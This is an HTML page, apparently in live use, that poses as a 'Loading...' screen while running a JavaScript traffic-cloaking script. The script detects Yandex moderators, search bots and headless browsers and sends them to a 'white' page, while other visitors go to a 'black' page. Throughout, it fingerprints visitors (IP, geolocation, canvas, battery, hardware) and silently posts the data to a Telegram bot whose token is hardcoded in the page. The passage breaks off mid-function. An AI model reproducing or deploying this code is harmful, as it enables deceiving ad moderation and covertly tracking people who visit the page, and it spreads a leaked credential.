<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ó–∞–≥—Ä—É–∑–∫–∞...</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f0f0f0;
            margin: 0;
            font-family: sans-serif;
            flex-direction: column;
            text-align: center;
        }
        .loader {
            border: 8px solid #e0e0e0;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .bot-trap-link {
            position: absolute;
            left: -9999px;
            top: -9999px;
            opacity: 0;
            width: 1px;
            height: 1px;
            overflow: hidden;
        }
         #mouse-prompt {
            margin-top: 15px;
            padding: 10px 15px;
            background-color: #ffffff;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            animation: pulse 2s infinite;
            cursor: default; /* –ß—Ç–æ–±—ã –Ω–µ –≤—ã–≥–ª—è–¥–µ–ª–æ –∫–ª–∏–∫–∞–±–µ–ª—å–Ω—ã–º */
         }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.03); }
            100% { transform: scale(1); }
        }
        /* –°–∫—Ä—ã–≤–∞–µ–º –ø–æ–¥—Å–∫–∞–∑–∫—É –Ω–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö */
        @media (hover: none) or (max-width: 768px) { /* –£–ª—É—á—à–µ–Ω–æ: –Ω–µ —Ç–æ–ª—å–∫–æ –ø–æ —à–∏—Ä–∏–Ω–µ, –Ω–æ –∏ –ø–æ –æ—Ç—Å—É—Ç—Å—Ç–≤–∏—é hover */
            #mouse-prompt {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>–ó–∞–≥—Ä—É–∑–∫–∞...</p>
    <div id="mouse-prompt">üñ±Ô∏è –ü–æ–¥–≤–∏–≥–∞–π—Ç–µ –∫—É—Ä—Å–æ—Ä–æ–º, –µ—Å–ª–∏ –≤—ã —á–µ–ª–æ–≤–µ–∫</div>

    <!-- –ù–µ–≤–∏–¥–∏–º–∞—è —Å—Å—ã–ª–∫–∞-–ª–æ–≤—É—à–∫–∞ -->
    <a href="#" class="bot-trap-link" aria-hidden="true" tabindex="-1">Bot Trap</a>

    <!-- Yandex.Metrika counter -->
    <script type="text/javascript" >
       (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
       m[i].l=1*new Date();
       for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
       k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
       (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

       ym(101122135, "init", {
            clickmap:true,
            trackLinks:true,
            accurateTrackBounce:true,
            webvisor:true
       });
    </script>
    <noscript><div><img src="https://mc.yandex.ru/watch/101122135" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
    <!-- /Yandex.Metrika counter -->

    <script>
        const PAGE_LOAD_START = performance.now();

        // --- –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ---
        const WHITE_PAGE = 'https://dzen.ru';
        const BLACK_PAGE = 'https://google.com';
        const TELEGRAM_BOT_TOKEN = '7853695428:AAFhxiIHq67-UOQbP7bJ4FrH0EmwtWGswNU';
        const TELEGRAM_CHAT_ID = '1237450939';
        const CONFIG_FILE = 'config.txt';
        const BLOCKLIST_FILE = 'blckip.txt';
        const LINKS_FILE = 'links.txt';
        const IP_FETCH_TIMEOUT = 2000;
        const DNS_FETCH_TIMEOUT = 2000;
        const NO_MOUSE_MOVE_TIMEOUT_DESKTOP = 6000;
        const REDIRECT_DELAY_AFTER_MOUSE_MOVE = 500;
        const REDIRECT_DELAY_MOBILE = 500;
        const REDIRECT_DELAY_FALLBACK = 1000;
        const VISIT_TRACKING_WINDOW_MINUTES = 30;
        const MAX_VISITS_PER_WINDOW = 5;
        const VISIT_BLOCK_DURATION_HOURS = 1;

        const SEARCH_BOT_AGENTS = [ /* –°–ø–∏—Å–æ–∫ –æ—Å—Ç–∞–µ—Ç—Å—è —Ç–µ–º –∂–µ, –Ω–µ –±—É–¥—É –ø–æ–≤—Ç–æ—Ä—è—Ç—å –¥–ª—è –∫—Ä–∞—Ç–∫–æ—Å—Ç–∏ */
            /YandexBot/i, /Googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i, /baiduspider/i,
            /facebookexternalhit/i, /Applebot/i, /bot/i, /spider/i, /crawler/i, /scraper/i,
             // ... (–ø–æ–ª–Ω—ã–π —Å–ø–∏—Å–æ–∫ –∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ –æ—Ç–≤–µ—Ç–∞)
             /DataForSeoBot/i
        ];
        const YANDEX_DOMAINS = [
            '.yandex.ru', '.yandex.net', '.yandex.com', '.yandex.by', '.yandex.kz',
            '.yandex.ua', '.yandex.md', '.yandex.com.tr', '.yandex.com.am'
        ];

        // --- –ì–õ–û–ë–ê–õ–¨–ù–´–ï –ü–ï–†–ï–ú–ï–ù–ù–´–ï ---
        let config = {};
        let botTrapActivated = false;
        let hadMouseMovement = false;
        let visitCount = 0; // –ë—É–¥–µ—Ç –æ–±–Ω–æ–≤–ª–µ–Ω –∏–∑ localStorage
        let pageFullyLoaded = false;
        let redirectTarget = BLACK_PAGE;
        let cloakedReason = null; // –§–∏–Ω–∞–ª—å–Ω–∞—è —Å—Ç—Ä–æ–∫–∞ —Å –ø—Ä–∏—á–∏–Ω–∞–º–∏
        let userInfo = {};
        let blockListIPs = new Set();
        let targetLinks = [];
        let isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        let noMouseMoveTimeoutId = null;
        let redirectTimeoutId = null;
        let reportSent = false; // –ì–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ—Ç –æ—Ç–ø—Ä–∞–≤–∫—É —Ç–æ–ª—å–∫–æ –æ–¥–Ω–æ–≥–æ –æ—Ç—á–µ—Ç–∞

        // --- –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò --- (getUrlParameter, loadFile, parseConfig, IP/Geo/Canvas...)
        // –û–Ω–∏ –æ—Å—Ç–∞—é—Ç—Å—è –ø–æ—á—Ç–∏ –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π, –∫—Ä–æ–º–µ parseConfig –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ visitCount

        function getUrlParameter(name) { /* ... –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π ... */
             name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
             const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
             const results = regex.exec(location.search);
             return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
         }
        async function loadFile(url) { /* ... –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π ... */
             try {
                 const response = await fetch(url, { cache: 'no-store' });
                 if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                 return await response.text();
             } catch (error) {
                 console.error(`Error loading file ${url}:`, error);
                 return null;
             }
         }
        function parseConfig(text) { /* ... –ø–æ—á—Ç–∏ –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π ... */
             const lines = text ? text.split('\n') : [];
             const settings = { desktop: {}, mobile: {} };
             lines.forEach(line => {
                 line = line.trim();
                 if (line && !line.startsWith('#')) {
                     const parts = line.split('=');
                     if (parts.length === 2) {
                         const key = parts[0].trim();
                         const value = parts[1].trim().toLowerCase() === 'on';
                         if (key.startsWith('desktop.')) settings.desktop[key.substring(8)] = value;
                         else if (key.startsWith('mobile.')) settings.mobile[key.substring(7)] = value;
                         else { settings.desktop[key] = value; settings.mobile[key] = value; }
                     }
                 }
             });
             const defaults = {
                 checkBotTrap: true, checkSearchBotUA: true, checkHeadless: true,
                 checkYandexIframe: true, checkYandexBotDeep: true, checkIpBlocklist: true,
                 checkModeratorDevTools: true, checkNoMouseMove: true, checkFrequency: true,
                 checkDevToolsTiming: false, checkDevToolsExtensions: false, checkYandexBehavior: false
             };
             for (const type of ['desktop', 'mobile']) {
                 for (const key in defaults) {
                     if (settings[type][key] === undefined) settings[type][key] = defaults[key];
                 }
                 if (type === 'mobile') {
                     settings.mobile.checkNoMouseMove = false;
                     settings.mobile.checkFrequency = false;
                     settings.mobile.checkModeratorDevTools = false; // –û—Ç–∫–ª—é—á–∞–µ–º –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
                 }
             }
             // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º visitCount –∑–¥–µ—Å—å, –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ –∫–æ–Ω—Ñ–∏–≥–∞
             try {
                 visitCount = parseInt(localStorage.getItem('visitCount') || '0');
             } catch(e) {
                 console.error("Error reading visitCount from localStorage:", e);
                 visitCount = 0;
             }
             return settings;
         }
        async function getIPAddress() { /* ... –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π, —Å —Ç–∞–π–º–∞—É—Ç–æ–º ... */
            const ipSources = [ 'https://api.ipify.org?format=json', 'https://ipinfo.io/json', 'https://api.myip.com', 'https://ipapi.co/json/' ];
            for (const url of ipSources) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), IP_FETCH_TIMEOUT);
                    const response = await fetch(url, { signal: controller.signal, cache: 'no-store' });
                    clearTimeout(timeoutId);
                    if (!response.ok) continue;
                    const data = await response.json();
                    if (data.ip) return data.ip;
                    if (data.query) return data.query;
                    if (data.myip) return data.myip;
                    if (typeof data === 'string' && /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(data)) return data;
                } catch (error) { console.warn(`Failed to fetch IP from ${url}:`, error.name === 'AbortError' ? 'Timeout' : error.message); }
            }
            console.warn('Could not determine IP address.'); return null;
         }
        async function getGeoLocation(ip) { /* ... –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π, —Å —Ç–∞–π–º–∞—É—Ç–æ–º ... */
            if (!ip) return 'IP –ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω';
            const geoSources = [ `https://ipinfo.io/${ip}/geo`, `https://ipapi.co/${ip}/json/` ];
            for (const url of geoSources) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), IP_FETCH_TIMEOUT);
                    const response = await fetch(url, { signal: controller.signal, cache: 'no-store' });
                    clearTimeout(timeoutId);
                    if (!response.ok) continue;
                    const data = await response.json();
                    let location = [];
                    if (data.country_name || data.country) location.push(data.country_name || data.country);
                    if (data.region) location.push(data.region);
                    if (data.city) location.push(data.city);
                    if (location.length > 0) return location.join(', ');
                } catch (error) { console.warn(`Failed to fetch Geo from ${url}:`, error.name === 'AbortError' ? 'Timeout' : error.message); }
            }
            console.warn(`Could not determine Geo location for IP ${ip}.`); return '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ';
        }
        function getCanvasFingerprint() { /* ... –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π ... */
            try {
                const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d');
                const txt = 'BrowserCanvasFingerprint 1.0 - –ü—Ä–∏–≤–µ—Ç, –º–∏—Ä! ‰Ω†Â•Ω,‰∏ñÁïå!';
                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069";
                ctx.fillText(txt, 2, 15); ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText(txt, 4, 17);
                return canvas.toDataURL();
            } catch (e) { return 'Canvas Error'; }
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Ç—á–µ—Ç–∞ –≤ Telegram (–æ–¥–∏–Ω —Ä–∞–∑ –ø—Ä–∏ —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏–∏)
        async function sendCloakReport(reasons, data) {
            if (reportSent) return; // –ù–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º, –µ—Å–ª–∏ —É–∂–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω
            reportSent = true;

            const reportData = { ...data };
            const loadTime = performance.now() - PAGE_LOAD_START;
            const batteryInfo = reportData.battery || { level: 'N/A', charging: 'N/A' };
            const connectionInfo = reportData.connection || { type: 'N/A', rtt: 'N/A' };
            const canvasFP = reportData.canvasFingerprint ? reportData.canvasFingerprint.substring(0, 100) + '...' : 'N/A';

            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –ø–æ–ª–Ω—ã–º —Å–ø–∏—Å–∫–æ–º –ø—Ä–∏—á–∏–Ω
            const reasonString = Array.isArray(reasons) ? reasons.join('; ') : reasons;

            const message = `
ü™§ –ö–õ–û–ê–ö–ê: –õ–û–í–£–®–ö–ê –°–†–ê–ë–û–¢–ê–õ–ê

‚ö†Ô∏è –ü—Ä–∏—á–∏–Ω–∞(—ã): ${reasonString}

üì± –¢–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${reportData.deviceType}
üî¢ –°—á–µ—Ç—á–∏–∫ –ø–æ—Å–µ—â–µ–Ω–∏–π: ${reportData.visitCount}
üåê IP: ${reportData.ip || '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω'}
üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: ${reportData.geoLocation || '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ'}
üñ•Ô∏è User-Agent: ${reportData.userAgent || 'N/A'}
üìè –≠–∫—Ä–∞–Ω: ${reportData.screenResolution || 'N/A'} (${reportData.pixelRatio || 'N/A'}x)
‚è±Ô∏è –í—Ä–µ–º—è –Ω–∞ —Å—Ç—Ä.: ${loadTime.toFixed(0)}–º—Å
üîó URL: ${reportData.currentUrl || 'N/A'}
‚Ü©Ô∏è Referrer: ${reportData.referrer || 'none'}

üñ±Ô∏è –î–≤–∏–∂–µ–Ω–∏–µ –º—ã—à–∏: ${reportData.hadMouseMovement ? 'yes' : 'no'}
üîã –ë–∞—Ç–∞—Ä–µ—è: –ó–∞—Ä—è–¥: ${batteryInfo.level !== 'N/A' ? (batteryInfo.level * 100).toFixed(0) + '%' : 'N/A'}, –ó–∞—Ä—è–∂–∞–µ—Ç—Å—è: ${batteryInfo.charging ? '–¥–∞' : '–Ω–µ—Ç'}
üß† –Ø–¥—Ä–∞ CPU: ${reportData.cpuCores || 'N/A'}
üíæ –ü–∞–º—è—Ç—å: ${reportData.deviceMemory || 'N/A'}
üåç –Ø–∑—ã–∫: ${reportData.language || 'N/A'} (${reportData.languages ? reportData.languages.join(', ') : 'N/A'})
‚è∞ –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${reportData.timeZone || 'N/A'}
üîå –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ: ${connectionInfo.type} (RTT: ${connectionInfo.rtt})
ü§ñ WebDriver: ${reportData.webdriver ? 'yes' : 'no'}
üé® Canvas: ${canvasFP}
üç™ Cookies: ${reportData.cookiesEnabled ? 'yes' : 'no'} | LocalStorage: ${reportData.localStorageEnabled ? 'yes' : 'no'}
üö´ DoNotTrack: ${reportData.doNotTrack || 'N/A'}
üîå –ü–ª–∞–≥–∏–Ω—ã: ${reportData.plugins ? reportData.plugins.length : '0'}
‚öôÔ∏è –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${reportData.platform || 'N/A'}
üé® –ì–ª—É–±–∏–Ω–∞ —Ü–≤–µ—Ç–∞: ${reportData.colorDepth || 'N/A'}
üñºÔ∏è –û–∫–Ω–æ: ${reportData.windowSize || 'N/A'}
üïµÔ∏è‚Äç‚ôÇÔ∏è –õ–æ–≤—É—à–∫–∞ –Ω–∞–∂–∞—Ç–∞: ${reportData.botTrapActivated ? 'yes' : 'no'}
            `.trim();

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (response.ok) console.log('Cloak report sent to Telegram.');
                else {
                    console.error('Failed to send Telegram report:', response.status, await response.text());
                    reportSent = false; // –ü–æ–∑–≤–æ–ª–∏—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω—É—é –ø–æ–ø—ã—Ç–∫—É? –ò–ª–∏ –Ω–µ—Ç? –ü–æ–∫–∞ –æ—Å—Ç–∞–≤–∏–º —Ç–∞–∫.
                }
            } catch (error) {
                console.error('Error sending Telegram report:', error);
                reportSent = false;
            }
        }

        // –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        async function collectUserInfo() { /* ... –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π ... */
            const batteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
            const ipPromise = getIPAddress();
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
            const ip = await ipPromise;
            const geoLocationPromise = getGeoLocation(ip);
            const battery = await batteryPromise;
            const geoLocation = await geoLocationPromise;

            return {
                timestamp: new Date().toISOString(), userAgent: navigator.userAgent || 'N/A',
                language: navigator.language || 'N/A', languages: navigator.languages || [],
                platform: navigator.platform || 'N/A', deviceType: isMobile ? '–ú–æ–±–∏–ª—å–Ω–æ–µ' : '–î–µ—Å–∫—Ç–æ–ø',
                visitCount: visitCount, screenResolution: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`, pixelRatio: window.devicePixelRatio || 'N/A',
                colorDepth: screen.colorDepth || 'N/A', referrer: document.referrer || 'none',
                currentUrl: window.location.href, cookiesEnabled: navigator.cookieEnabled || false,
                localStorageEnabled: typeof(Storage) !== "undefined", plugins: Array.from(navigator.plugins || []).map(p => p.name),
                cpuCores: navigator.hardwareConcurrency || 'N/A', deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A',
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
                connection: { type: connection.effectiveType || 'N/A', rtt: connection.rtt || 'N/A' },
                webdriver: navigator.webdriver || false, doNotTrack: navigator.doNotTrack || 'N/A',
                battery: battery ? { level: battery.level, charging: battery.charging } : null,
                canvasFingerprint: getCanvasFingerprint(), hadMouseMovement: hadMouseMovement,
                botTrapActivated: botTrapActivated, loadTime: (performance.now() - PAGE_LOAD_START).toFixed(0),
                ip: ip, geoLocation: geoLocation
            };
         }

        // --- –§–£–ù–ö–¶–ò–ò –ü–†–û–í–ï–†–û–ö ---

        // 1. –õ–æ–≤—É—à–∫–∞ –¥–ª—è –±–æ—Ç–æ–≤
        function checkBotTrap(cfg) {
            return cfg.checkBotTrap && botTrapActivated ? '–ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞ –ª–æ–≤—É—à–∫–∞ –¥–ª—è –±–æ—Ç–æ–≤ (–∫–ª–∏–∫ –ø–æ —Å–∫—Ä—ã—Ç–æ–π —Å—Å—ã–ª–∫–µ)' : null;
        }

        // 2. –ü–æ–∏—Å–∫–æ–≤—ã–µ –±–æ—Ç—ã –ø–æ User-Agent
        function isSearchBot(cfg, userAgent) {
            if (!cfg.checkSearchBotUA) return null;
            const foundBot = SEARCH_BOT_AGENTS.find(regex => regex.test(userAgent));
            return foundBot ? `–û–±–Ω–∞—Ä—É–∂–µ–Ω –ø–æ–∏—Å–∫–æ–≤—ã–π –±–æ—Ç (User-Agent —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å ${foundBot.source})` : null;
        }

        // 3. Headless –±—Ä–∞—É–∑–µ—Ä—ã –∏ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è
        function isHeadlessBrowser(cfg) {
            if (!cfg.checkHeadless) return null;
            let reasons = [];
            if (navigator.webdriver) reasons.push('navigator.webdriver=true');
            if (window.callPhantom || window._phantom) reasons.push('PhantomJS detected');
            if (navigator.userAgent.includes('HeadlessChrome')) reasons.push('HeadlessChrome UA');
            if (navigator.plugins && navigator.plugins.length === 0 && !isMobile) reasons.push('navigator.plugins.length is 0 on desktop');
            // –î–æ–ø. –ø—Ä–æ–≤–µ—Ä–∫–∏ –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å —Å—é–¥–∞
            return reasons.length > 0 ? `–û–±–Ω–∞—Ä—É–∂–µ–Ω Headless –±—Ä–∞—É–∑–µ—Ä –∏–ª–∏ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è (${reasons.join(', ')})` : null;
        }

        // 4. Iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏ –Ø–Ω–¥–µ–∫—Å–∞ (–¢–û–õ–¨–ö–û IFRAME SRC)
        let yandexIframeDetected = false; // –§–ª–∞–≥ –¥–ª—è MutationObserver
        function checkForYandexIframeSrc(node) { // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —É–∑–ª–∞
             if (node.tagName === 'IFRAME') {
                 const src = node.getAttribute('src') || '';
                 // –ò—â–µ–º –¢–û–õ–¨–ö–û —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ URL
                 if (src.includes('iframe-yang.yandex') || src.includes('yandex.ru/safeframe') || src.includes('ads.yandex.')) {
                     return true; // –ù–∞–π–¥–µ–Ω –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–π iframe
                 }
             }
             return false;
        }
         const observer = new MutationObserver((mutationsList) => {
             const currentConfig = isMobile ? config.mobile : config.desktop;
             if (!currentConfig?.checkYandexIframe || yandexIframeDetected) return; // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–Ω—Ñ–∏–≥ –∏ —Ñ–ª–∞–≥

             for (const mutation of mutationsList) {
                 if (mutation.type === 'childList') {
                     mutation.addedNodes.forEach(node => {
                         if (checkForYandexIframeSrc(node)) {
                             yandexIframeDetected = true;
                             console.log('Yandex moderation iframe detected dynamically:', node.getAttribute('src'));
                             // observer.disconnect(); // –ú–æ–∂–Ω–æ –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –Ω–∞–±–ª—é–¥–µ–Ω–∏–µ
                         }
                         // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –¥–æ—á–µ—Ä–Ω–∏–µ —É–∑–ª—ã –¥–æ–±–∞–≤–ª–µ–Ω–Ω–æ–≥–æ —É–∑–ª–∞ (–µ—Å–ª–∏ iframe –≤–ª–æ–∂–µ–Ω)
                         if (node.querySelectorAll) {
                             node.querySelectorAll('iframe').forEach(iframe => {
                                 if (checkForYandexIframeSrc(iframe)) {
                                     yandexIframeDetected = true;
                                     console.log('Yandex moderation iframe detected dynamically (nested):', iframe.getAttribute('src'));
                                 }
                             });
                         }
                     });
                 }
             }
         });
         document.addEventListener('DOMContentLoaded', () => {
             const initialConfig = isMobile ? config.mobile : config.desktop;
             if (initialConfig?.checkYandexIframe) {
                 observer.observe(document.body, { childList: true, subtree: true });
                 // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ iframe –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
                 document.querySelectorAll('iframe').forEach(iframe => {
                     if (checkForYandexIframeSrc(iframe)) {
                         yandexIframeDetected = true;
                         console.log('Yandex moderation iframe detected statically:', iframe.getAttribute('src'));
                     }
                 });
             }
         });
        function hasYandexModeratorIframe(cfg) {
            // –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è —Ç–µ–ø–µ—Ä—å –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –ø—Ä–∏—á–∏–Ω—É –¢–û–õ–¨–ö–û –µ—Å–ª–∏ –Ω–∞–π–¥–µ–Ω iframe
             if (!cfg.checkYandexIframe) return null;
             // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–ª–∞–≥, —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–π —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏ –∏–ª–∏ MutationObserver
             if (yandexIframeDetected) {
                 return '–û–±–Ω–∞—Ä—É–∂–µ–Ω iframe, –ø–æ—Ö–æ–∂–∏–π –Ω–∞ iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏/—Ä–µ–∫–ª–∞–º—ã –Ø–Ω–¥–µ–∫—Å–∞';
             }
             // –£–ë–†–ê–ù–´ –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞ window.Ya, window.yandex –∏ —Ç.–¥.
            return null;
        }

        // 5. –ë–æ—Ç—ã –Ø–Ω–¥–µ–∫—Å–∞ (—É–≥–ª—É–±–ª–µ–Ω–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞)
        async function isYandexBot(cfg, userInfo) {
            if (!cfg.checkYandexBotDeep) return null;
            let reasons = [];

            // 5.1 User-Agent
            if (/Yandex/i.test(userInfo.userAgent)) {
                reasons.push('User-Agent —Å–æ–¥–µ—Ä–∂–∏—Ç "Yandex"');
            }

            // 5.2 –ü–æ–≤–µ–¥–µ–Ω–∏–µ (–≠–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–∞–ª—å–Ω–æ, –∏—â–µ–º –ù–ï –æ–±—â–∏–µ –æ–±—ä–µ–∫—Ç—ã)
            if (cfg.checkYandexBehavior) {
                 let behaviorFlags = [];
                 // –ü—Ä–∏–º–µ—Ä: –∏—â–µ–º —á—Ç–æ-—Ç–æ —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω–æ–µ, –ù–ï window.Ya
                 if (typeof ___yandex_ad_callbacks !== 'undefined') behaviorFlags.push('___yandex_ad_callbacks');
                 if (document.querySelector('script[src*="iframe-yang.yandex"]')) behaviorFlags.push('script[src*=iframe-yang]');
                 // –î–æ–±–∞–≤–∏—Ç—å –¥—Ä—É–≥–∏–µ —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏, –µ—Å–ª–∏ –∏–∑–≤–µ—Å—Ç–Ω—ã
                 if (behaviorFlags.length > 0) {
                     reasons.push(`–û–±–Ω–∞—Ä—É–∂–µ–Ω–æ —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω–æ–µ –ø–æ–≤–µ–¥–µ–Ω–∏–µ/JS –Ø–Ω–¥–µ–∫—Å–∞ (${behaviorFlags.join(', ')})`);
                 }
            }

            // 5.3 Iframe (–∏—Å–ø–æ–ª—å–∑—É–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –æ—Ç–¥–µ–ª—å–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏)
            const iframeReason = hasYandexModeratorIframe(cfg); // –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è —Ç–µ–ø–µ—Ä—å –ø—Ä–æ–≤–µ—Ä—è–µ—Ç —Ç–æ–ª—å–∫–æ iframe
            if (iframeReason) {
                reasons.push(iframeReason); // –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–∏—á–∏–Ω—É –ø—Ä–æ iframe
            }

            // 5.4 IP-–∞–¥—Ä–µ—Å
            if (userInfo.ip) {
                const isYandex = await isYandexIP(userInfo.ip);
                if (isYandex) {
                    reasons.push(`IP ${userInfo.ip} –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç —Å–µ—Ç–∏ –Ø–Ω–¥–µ–∫—Å–∞ (Reverse DNS)`);
                }
            }

            // –°—á–∏—Ç–∞–µ–º –±–æ—Ç–æ–º –Ø–Ω–¥–µ–∫—Å–∞, –µ—Å–ª–∏ –µ—Å—Ç—å —Ö–æ—Ç—è –±—ã –æ–¥–Ω–∞ –ø—Ä–∏—á–∏–Ω–∞
            return reasons.length > 0 ? `–û–±–Ω–∞—Ä—É–∂–µ–Ω –±–æ—Ç/–º–æ–¥–µ—Ä–∞—Ç–æ—Ä –Ø–Ω–¥–µ–∫—Å–∞ (${reasons.join('; ')})` : null;
        }
        async function isYandexIP(ip) { /* ... –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π, —Å —Ç–∞–π–º–∞—É—Ç–æ–º ... */
             if (!ip) return false;
             const url = `https://dns.google/resolve?name=${ip}&type=PTR`;
             try {
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), DNS_FETCH_TIMEOUT);
                 const response = await fetch(url, { signal: controller.signal, cache: 'no-store' });
                 clearTimeout(timeoutId);
                 if (!response.ok) return false;
                 const data = await response.json();
                 if (data.Status === 0 && data.Answer) {
                     return data.Answer.some(answer =>
                         answer.type === 12 &&
                         YANDEX_DOMAINS.some(domain => answer.data.toLowerCase().endsWith(domain + '.'))
                     );
                 }
